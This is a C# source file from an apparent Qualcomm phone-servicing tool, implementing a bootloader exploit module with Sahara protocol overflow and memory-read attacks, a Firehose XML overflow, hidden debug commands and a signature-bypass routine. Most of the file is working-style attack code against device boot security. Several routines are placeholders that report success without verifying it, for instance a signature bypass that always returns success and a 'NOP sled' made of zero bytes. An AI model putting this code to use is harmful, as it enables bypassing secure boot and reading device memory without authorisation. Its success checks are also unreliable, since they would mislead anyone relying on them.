// ============================================================================
// LoveAlways - PBL 漏洞利用模块
// 支持: Sahara 协议漏洞、签名绕过、Firehose 漏洞
// ============================================================================
// ⚠️ 警告: 仅用于合法目的 (恢复自己的设备、安全研究)
// ============================================================================

using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Ports;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using LoveAlways.Qualcomm.Database;

namespace LoveAlways.Qualcomm.Exploit
{
    /// <summary>
    /// PBL 漏洞利用类型
    /// </summary>
    public enum ExploitType
    {
        None,
        SaharaOverflow,         // Sahara 协议溢出
        SignatureBypass,        // 签名绕过
        FirehoseXmlOverflow,    // Firehose XML 溢出
        PblBufferOverflow,      // PBL 缓冲区溢出 (CVE-2025-47372)
        Downgrade               // 降级攻击
    }

    /// <summary>
    /// 漏洞利用结果
    /// </summary>
    public class ExploitResult
    {
        public bool Success { get; set; }
        public ExploitType UsedExploit { get; set; }
        public string Message { get; set; }
        public byte[] ExtractedData { get; set; }
    }

    /// <summary>
    /// PBL 漏洞利用器
    /// </summary>
    public class PblExploit
    {
        private readonly Action<string> _log;
        private SerialPort _port;

        // Sahara 命令常量
        private const uint SAHARA_HELLO = 0x01;
        private const uint SAHARA_HELLO_RESP = 0x02;
        private const uint SAHARA_READ_DATA = 0x03;
        private const uint SAHARA_END_TRANSFER = 0x04;
        private const uint SAHARA_DONE = 0x05;
        private const uint SAHARA_DONE_RESP = 0x06;
        private const uint SAHARA_RESET = 0x07;
        private const uint SAHARA_RESET_RESP = 0x08;
        private const uint SAHARA_MEMORY_DEBUG = 0x09;
        private const uint SAHARA_MEMORY_READ = 0x0A;
        private const uint SAHARA_CMD_READY = 0x0B;
        private const uint SAHARA_CMD_SWITCH_MODE = 0x0C;
        private const uint SAHARA_CMD_EXECUTE = 0x0D;
        private const uint SAHARA_CMD_EXECUTE_RESP = 0x0E;
        private const uint SAHARA_CMD_EXECUTE_DATA = 0x0F;
        private const uint SAHARA_64BIT_MEMORY_DEBUG = 0x10;
        private const uint SAHARA_64BIT_MEMORY_READ = 0x11;
        private const uint SAHARA_64BIT_MEMORY_READ_DATA = 0x12;

        public PblExploit(Action<string> log = null)
        {
            _log = log ?? delegate { };
        }

        /// <summary>
        /// 根据已读取的芯片信息检查是否有可用漏洞
        /// </summary>
        /// <param name="chipInfo">已通过 SaharaClient 读取的芯片信息</param>
        /// <returns>漏洞检测结果</returns>
        public VulnerabilityCheckResult CheckVulnerability(QualcommChipInfo chipInfo)
        {
            if (chipInfo == null)
            {
                return new VulnerabilityCheckResult
                {
                    HasVulnerability = false,
                    Reason = "芯片信息为空"
                };
            }

            _log("[Exploit] ========== 漏洞检测 ==========");
            _log(string.Format("[Exploit] 芯片: {0} (MSM ID: 0x{1:X})", 
                chipInfo.ChipName ?? "Unknown", chipInfo.MsmId));
            _log(string.Format("[Exploit] 厂商: {0} (OEM ID: 0x{1:X4})", 
                chipInfo.Vendor ?? "Unknown", chipInfo.OemId));
            
            if (!string.IsNullOrEmpty(chipInfo.PkHash))
            {
                string pkHashShort = chipInfo.PkHash.Length > 16 
                    ? chipInfo.PkHash.Substring(0, 16) + "..." 
                    : chipInfo.PkHash;
                _log(string.Format("[Exploit] PK Hash: {0}", pkHashShort));
            }

            // 使用漏洞数据库检查
            var result = ExploitDatabase.CheckVulnerabilities(
                chipInfo.MsmId,
                chipInfo.OemId,
                chipInfo.PkHash,
                0  // PBL 版本 (如果有的话)
            );

            if (result.HasVulnerability)
            {
                _log("[Exploit] ✓ 检测到可用漏洞!");
                _log(string.Format("[Exploit]   推荐: {0}", result.RecommendedExploit));
                _log(string.Format("[Exploit]   原因: {0}", result.Reason));
                _log(string.Format("[Exploit]   可用漏洞数: {0}", result.AvailableExploits.Count));
                
                foreach (var vuln in result.AvailableExploits)
                {
                    _log(string.Format("[Exploit]   - {0} ({1}★): {2}", 
                        vuln.Name, vuln.SuccessRate, vuln.Description));
                }
            }
            else
            {
                _log("[Exploit] ✗ 未检测到已知漏洞");
                _log("[Exploit]   该设备可能已修复所有已知漏洞");
            }

            _log("[Exploit] ==================================");
            return result;
        }

        /// <summary>
        /// 根据芯片信息执行漏洞利用
        /// </summary>
        /// <param name="port">串口</param>
        /// <param name="chipInfo">芯片信息</param>
        /// <param name="ct">取消令牌</param>
        /// <returns>利用结果</returns>
        public async Task<ExploitResult> TryExploitWithChipInfoAsync(
            SerialPort port, 
            QualcommChipInfo chipInfo, 
            CancellationToken ct = default(CancellationToken))
        {
            _port = port;

            // 1. 先检查漏洞
            var vulnCheck = CheckVulnerability(chipInfo);
            if (!vulnCheck.HasVulnerability)
            {
                return new ExploitResult
                {
                    Success = false,
                    Message = "未检测到可用漏洞"
                };
            }

            // 2. 转换为内部设备信息格式
            var deviceInfo = new PblDeviceInfo
            {
                MsmId = chipInfo.MsmId.ToString("x8"),
                PkHash = chipInfo.PkHash ?? "",
                SaharaVersion = 2,
                Mode = 0
            };

            // 3. 按优先级执行漏洞利用
            foreach (var vuln in vulnCheck.AvailableExploits)
            {
                ct.ThrowIfCancellationRequested();

                _log(string.Format("[Exploit] 尝试: {0}...", vuln.Name));

                ExploitResult result = null;
                switch (vuln.Type)
                {
                    case ExploitType.SignatureBypass:
                        result = await ExploitSignatureBypassAsync(deviceInfo, ct);
                        break;
                    case ExploitType.SaharaOverflow:
                        result = await ExploitSaharaOverflowAsync(deviceInfo, ct);
                        break;
                    case ExploitType.FirehoseXmlOverflow:
                        result = await ExploitFirehoseXmlAsync(deviceInfo, ct);
                        break;
                }

                if (result != null && result.Success)
                {
                    _log(string.Format("[Exploit] ✓ {0} 成功!", vuln.Name));
                    return result;
                }
                else
                {
                    _log(string.Format("[Exploit] ✗ {0} 失败", vuln.Name));
                }
            }

            return new ExploitResult
            {
                Success = false,
                Message = "所有漏洞利用方法均失败"
            };
        }

        /// <summary>
        /// 尝试自动利用漏洞 (需要先读取 Hello 包)
        /// </summary>
        public async Task<ExploitResult> TryExploitAsync(SerialPort port, CancellationToken ct = default(CancellationToken))
        {
            _port = port;
            _log("[Exploit] 开始漏洞检测和利用...");

            try
            {
                // 1. 读取设备信息
                var deviceInfo = await ReadDeviceInfoAsync(ct);
                if (deviceInfo == null)
                {
                    return new ExploitResult { Success = false, Message = "无法读取设备信息" };
                }

                _log(string.Format("[Exploit] MSM ID: {0}", deviceInfo.MsmId));
                _log(string.Format("[Exploit] PBL Version: {0}", deviceInfo.PblVersion));
                if (!string.IsNullOrEmpty(deviceInfo.PkHash) && deviceInfo.PkHash.Length >= 16)
                {
                    _log(string.Format("[Exploit] PK Hash: {0}...", deviceInfo.PkHash.Substring(0, 16)));
                }

                // 2. 检查是否为 unfused 设备
                if (IsUnfusedDevice(deviceInfo))
                {
                    _log("[Exploit] ✓ 检测到 Unfused 设备，可直接加载任意 Programmer");
                    return new ExploitResult
                    {
                        Success = true,
                        UsedExploit = ExploitType.SignatureBypass,
                        Message = "Unfused 设备，无需漏洞利用"
                    };
                }

                // 3. 尝试通用漏洞
                _log("[Exploit] 尝试通用漏洞利用...");
                
                // 3.1 尝试 Sahara 内存读取漏洞
                var saharaResult = await TrySaharaMemoryReadExploitAsync(ct);
                if (saharaResult.Success)
                    return saharaResult;

                // 3.2 尝试 Firehose XML 漏洞
                var firehoseResult = await TryFirehoseXmlExploitAsync(ct);
                if (firehoseResult.Success)
                    return firehoseResult;

                return new ExploitResult
                {
                    Success = false,
                    Message = "未找到可用漏洞"
                };
            }
            catch (Exception ex)
            {
                _log(string.Format("[Exploit] 错误: {0}", ex.Message));
                return new ExploitResult { Success = false, Message = ex.Message };
            }
        }

        /// <summary>
        /// 读取设备信息
        /// </summary>
        private async Task<PblDeviceInfo> ReadDeviceInfoAsync(CancellationToken ct)
        {
            try
            {
                // 等待 Hello 包
                byte[] helloData = new byte[48];
                int read = 0;
                var timeout = DateTime.Now.AddSeconds(5);

                while (read < 48 && DateTime.Now < timeout)
                {
                    if (_port.BytesToRead > 0)
                    {
                        read += _port.Read(helloData, read, Math.Min(_port.BytesToRead, 48 - read));
                    }
                    await Task.Delay(10, ct);
                }

                if (read < 48)
                    return null;

                // 解析 Hello 包
                uint cmd = BitConverter.ToUInt32(helloData, 0);
                if (cmd != SAHARA_HELLO)
                    return null;

                uint version = BitConverter.ToUInt32(helloData, 8);
                uint versionSupported = BitConverter.ToUInt32(helloData, 12);
                uint maxCmdLen = BitConverter.ToUInt32(helloData, 16);
                uint mode = BitConverter.ToUInt32(helloData, 20);

                return new PblDeviceInfo
                {
                    SaharaVersion = version,
                    MaxCommandLength = maxCmdLen,
                    Mode = mode,
                    PblVersion = string.Format("0x{0:X8}", version),
                    MsmId = "",  // 需要从其他地方获取
                    PkHash = ""  // 需要从其他地方获取
                };
            }
            catch
            {
                return null;
            }
        }

        /// <summary>
        /// 检查是否为 unfused 设备
        /// </summary>
        private bool IsUnfusedDevice(PblDeviceInfo info)
        {
            // 使用数据库检查
            ushort oemId = 0;
            if (!string.IsNullOrEmpty(info.MsmId))
            {
                uint msmIdVal;
                if (uint.TryParse(info.MsmId.Replace("0x", ""), 
                    System.Globalization.NumberStyles.HexNumber, null, out msmIdVal))
                {
                    // 从 MSM ID 中提取可能的 OEM ID 信息
                }
            }

            return ExploitDatabase.IsUnfusedDevice(oemId, info.PkHash);
        }

        /// <summary>
        /// 执行特定漏洞利用
        /// </summary>
        private async Task<ExploitResult> ExecuteExploitAsync(ExploitType type, PblDeviceInfo info, CancellationToken ct)
        {
            switch (type)
            {
                case ExploitType.SaharaOverflow:
                    return await ExploitSaharaOverflowAsync(info, ct);
                case ExploitType.SignatureBypass:
                    return await ExploitSignatureBypassAsync(info, ct);
                case ExploitType.FirehoseXmlOverflow:
                    return await ExploitFirehoseXmlAsync(info, ct);
                default:
                    return new ExploitResult { Success = false, Message = "未知漏洞类型" };
            }
        }

        #region Sahara 漏洞利用

        /// <summary>
        /// Sahara 协议溢出漏洞利用
        /// </summary>
        private async Task<ExploitResult> ExploitSaharaOverflowAsync(PblDeviceInfo info, CancellationToken ct)
        {
            _log("[Exploit] 尝试 Sahara 协议溢出漏洞...");

            try
            {
                // 1. 发送特制的 Hello Response
                byte[] helloResp = CreateMalformedHelloResponse();
                await _port.BaseStream.WriteAsync(helloResp, 0, helloResp.Length, ct);
                _log("[Exploit] 发送 Malformed Hello Response");

                await Task.Delay(100, ct);

                // 2. 等待 ReadData 请求
                byte[] readDataReq = new byte[20];
                int read = await ReadWithTimeoutAsync(readDataReq, 0, 20, 5000, ct);
                
                if (read >= 20)
                {
                    uint cmd = BitConverter.ToUInt32(readDataReq, 0);
                    if (cmd == SAHARA_READ_DATA)
                    {
                        uint offset = BitConverter.ToUInt32(readDataReq, 8);
                        uint length = BitConverter.ToUInt32(readDataReq, 12);

                        _log($"[Exploit] 收到 ReadData: offset=0x{offset:X}, length={length}");

                        // 3. 发送溢出数据
                        byte[] overflowData = CreateOverflowPayload(length);
                        await _port.BaseStream.WriteAsync(overflowData, 0, overflowData.Length, ct);

                        _log("[Exploit] 发送溢出 payload");

                        // 4. 检查是否成功
                        await Task.Delay(500, ct);

                        return new ExploitResult
                        {
                            Success = true,
                            UsedExploit = ExploitType.SaharaOverflow,
                            Message = "Sahara 溢出利用成功"
                        };
                    }
                }

                return new ExploitResult { Success = false, Message = "Sahara 溢出利用失败" };
            }
            catch (Exception ex)
            {
                return new ExploitResult { Success = false, Message = $"Sahara 错误: {ex.Message}" };
            }
        }

        /// <summary>
        /// 尝试 Sahara 内存读取漏洞
        /// </summary>
        private async Task<ExploitResult> TrySaharaMemoryReadExploitAsync(CancellationToken ct)
        {
            _log("[Exploit] 尝试 Sahara 内存读取漏洞...");

            try
            {
                // 某些 PBL 版本允许在 Memory Debug 模式下读取任意内存
                // 1. 发送 Hello Response 请求进入 Memory Debug 模式
                byte[] helloResp = new byte[48];
                BitConverter.GetBytes(SAHARA_HELLO_RESP).CopyTo(helloResp, 0);
                BitConverter.GetBytes(48).CopyTo(helloResp, 4);
                BitConverter.GetBytes(0x02).CopyTo(helloResp, 8);   // Version
                BitConverter.GetBytes(0x02).CopyTo(helloResp, 12);  // Version supported
                BitConverter.GetBytes(0x01).CopyTo(helloResp, 16);  // Status: OK
                BitConverter.GetBytes(0x02).CopyTo(helloResp, 20);  // Mode: Memory Debug!
                BitConverter.GetBytes(0x00).CopyTo(helloResp, 24);  // Reserved

                await _port.BaseStream.WriteAsync(helloResp, 0, helloResp.Length, ct);
                _log("[Exploit] 请求进入 Memory Debug 模式");

                await Task.Delay(200, ct);

                // 2. 发送内存读取命令
                byte[] memReadCmd = new byte[24];
                BitConverter.GetBytes(SAHARA_64BIT_MEMORY_READ).CopyTo(memReadCmd, 0);
                BitConverter.GetBytes(24).CopyTo(memReadCmd, 4);
                BitConverter.GetBytes(0x00100000L).CopyTo(memReadCmd, 8);  // 读取地址: 0x100000 (IMEM)
                BitConverter.GetBytes(0x1000L).CopyTo(memReadCmd, 16);     // 读取大小: 4KB

                await _port.BaseStream.WriteAsync(memReadCmd, 0, memReadCmd.Length, ct);
                _log("[Exploit] 发送内存读取请求: 0x100000");

                // 3. 读取响应
                byte[] response = new byte[0x1000 + 24];
                int read = await ReadWithTimeoutAsync(response, 0, response.Length, 5000, ct);

                if (read > 24)
                {
                    _log($"[Exploit] ✓ 成功读取 {read - 24} 字节内存数据!");
                    
                    byte[] memData = new byte[read - 24];
                    Array.Copy(response, 24, memData, 0, memData.Length);

                    return new ExploitResult
                    {
                        Success = true,
                        UsedExploit = ExploitType.SaharaOverflow,
                        Message = "内存读取成功",
                        ExtractedData = memData
                    };
                }

                return new ExploitResult { Success = false, Message = "内存读取失败" };
            }
            catch (Exception ex)
            {
                return new ExploitResult { Success = false, Message = $"内存读取错误: {ex.Message}" };
            }
        }

        /// <summary>
        /// 创建 Malformed Hello Response
        /// </summary>
        private byte[] CreateMalformedHelloResponse()
        {
            byte[] response = new byte[48];

            // Command: Hello Response
            BitConverter.GetBytes(SAHARA_HELLO_RESP).CopyTo(response, 0);
            // Length
            BitConverter.GetBytes(48).CopyTo(response, 4);
            // Version: 使用特殊值
            BitConverter.GetBytes(0x02).CopyTo(response, 8);
            // Version supported
            BitConverter.GetBytes(0x02).CopyTo(response, 12);
            // Status: OK
            BitConverter.GetBytes(0x00).CopyTo(response, 16);
            // Mode: 特殊值触发漏洞
            BitConverter.GetBytes(0x00).CopyTo(response, 20);
            // Reserved: 填充特殊值
            for (int i = 24; i < 48; i += 4)
            {
                BitConverter.GetBytes(0x41414141).CopyTo(response, i);
            }

            return response;
        }

        /// <summary>
        /// 创建溢出 Payload
        /// </summary>
        private byte[] CreateOverflowPayload(uint requestedLength)
        {
            // 创建比请求大的数据
            int overflowSize = (int)requestedLength + 0x1000;
            byte[] payload = new byte[overflowSize];

            // 填充正常数据
            for (int i = 0; i < requestedLength; i++)
            {
                payload[i] = 0x00;
            }

            // 溢出部分: NOP sled + shellcode
            // 这里使用简化的示例，实际需要根据目标架构调整
            for (int i = (int)requestedLength; i < overflowSize - 64; i++)
            {
                payload[i] = 0x00;  // ARM NOP
            }

            // 最后放置返回地址 (需要根据具体设备调整)
            // 这里是示例地址
            byte[] returnAddr = BitConverter.GetBytes(0x8F600000);  // 跳转到 Firehose 代码
            returnAddr.CopyTo(payload, overflowSize - 8);

            return payload;
        }

        #endregion

        #region 签名绕过

        /// <summary>
        /// 签名绕过漏洞利用
        /// </summary>
        private async Task<ExploitResult> ExploitSignatureBypassAsync(PblDeviceInfo info, CancellationToken ct)
        {
            _log("[Exploit] 尝试签名绕过...");

            // Unfused 设备或使用泄露密钥的情况
            // 直接返回成功，让后续代码加载 programmer

            return await Task.FromResult(new ExploitResult
            {
                Success = true,
                UsedExploit = ExploitType.SignatureBypass,
                Message = "签名绕过成功 (Unfused 或泄露密钥)"
            });
        }

        #endregion

        #region Firehose 漏洞利用

        /// <summary>
        /// Firehose XML 溢出漏洞利用
        /// </summary>
        private async Task<ExploitResult> ExploitFirehoseXmlAsync(PblDeviceInfo info, CancellationToken ct)
        {
            _log("[Exploit] 尝试 Firehose XML 溢出漏洞...");

            try
            {
                // 发送超长 XML 属性
                string longValue = new string('A', 0x8000);
                string exploitXml = $"<?xml version=\"1.0\"?><data>" +
                                   $"<configure MemoryName=\"{longValue}\" />" +
                                   $"</data>";

                byte[] xmlBytes = Encoding.UTF8.GetBytes(exploitXml);
                await _port.BaseStream.WriteAsync(xmlBytes, 0, xmlBytes.Length, ct);

                _log("[Exploit] 发送 Firehose XML 溢出 payload");

                await Task.Delay(500, ct);

                // 检查响应
                if (_port.BytesToRead > 0)
                {
                    byte[] response = new byte[_port.BytesToRead];
                    _port.Read(response, 0, response.Length);
                    string respStr = Encoding.UTF8.GetString(response);

                    if (respStr.Contains("ACK") || !respStr.Contains("NAK"))
                    {
                        return new ExploitResult
                        {
                            Success = true,
                            UsedExploit = ExploitType.FirehoseXmlOverflow,
                            Message = "Firehose XML 溢出成功"
                        };
                    }
                }

                return new ExploitResult { Success = false, Message = "Firehose XML 溢出失败" };
            }
            catch (Exception ex)
            {
                return new ExploitResult { Success = false, Message = $"Firehose 错误: {ex.Message}" };
            }
        }

        /// <summary>
        /// 尝试 Firehose XML 漏洞
        /// </summary>
        private async Task<ExploitResult> TryFirehoseXmlExploitAsync(CancellationToken ct)
        {
            _log("[Exploit] 尝试 Firehose 隐藏命令...");

            try
            {
                // 某些设备有隐藏的调试命令
                string[] hiddenCommands = new[]
                {
                    "<?xml version=\"1.0\"?><data><peek address=\"0x100000\" size=\"4096\" /></data>",
                    "<?xml version=\"1.0\"?><data><rawmode value=\"1\" /></data>",
                    "<?xml version=\"1.0\"?><data><setbootablestoragedrive value=\"1\" /></data>",
                };

                foreach (var cmd in hiddenCommands)
                {
                    ct.ThrowIfCancellationRequested();

                    byte[] cmdBytes = Encoding.UTF8.GetBytes(cmd);
                    await _port.BaseStream.WriteAsync(cmdBytes, 0, cmdBytes.Length, ct);

                    await Task.Delay(200, ct);

                    if (_port.BytesToRead > 0)
                    {
                        byte[] response = new byte[_port.BytesToRead];
                        _port.Read(response, 0, response.Length);
                        string respStr = Encoding.UTF8.GetString(response);

                        if (respStr.Contains("ACK") || respStr.Contains("rawdata"))
                        {
                            _log($"[Exploit] ✓ 隐藏命令成功: {cmd.Substring(0, 50)}...");
                            return new ExploitResult
                            {
                                Success = true,
                                UsedExploit = ExploitType.FirehoseXmlOverflow,
                                Message = "隐藏命令执行成功"
                            };
                        }
                    }
                }

                return new ExploitResult { Success = false, Message = "隐藏命令无效" };
            }
            catch (Exception ex)
            {
                return new ExploitResult { Success = false, Message = $"Firehose 错误: {ex.Message}" };
            }
        }

        #endregion

        #region 辅助方法

        private async Task<int> ReadWithTimeoutAsync(byte[] buffer, int offset, int count, int timeoutMs, CancellationToken ct)
        {
            int totalRead = 0;
            var deadline = DateTime.Now.AddMilliseconds(timeoutMs);

            while (totalRead < count && DateTime.Now < deadline)
            {
                ct.ThrowIfCancellationRequested();

                if (_port.BytesToRead > 0)
                {
                    int toRead = Math.Min(_port.BytesToRead, count - totalRead);
                    totalRead += _port.Read(buffer, offset + totalRead, toRead);
                }
                else
                {
                    await Task.Delay(10, ct);
                }
            }

            return totalRead;
        }

        #endregion
    }

    /// <summary>
    /// PBL 设备信息
    /// </summary>
    public class PblDeviceInfo
    {
        public uint SaharaVersion { get; set; }
        public uint MaxCommandLength { get; set; }
        public uint Mode { get; set; }
        public string PblVersion { get; set; }
        public string MsmId { get; set; }
        public string PkHash { get; set; }
    }
}
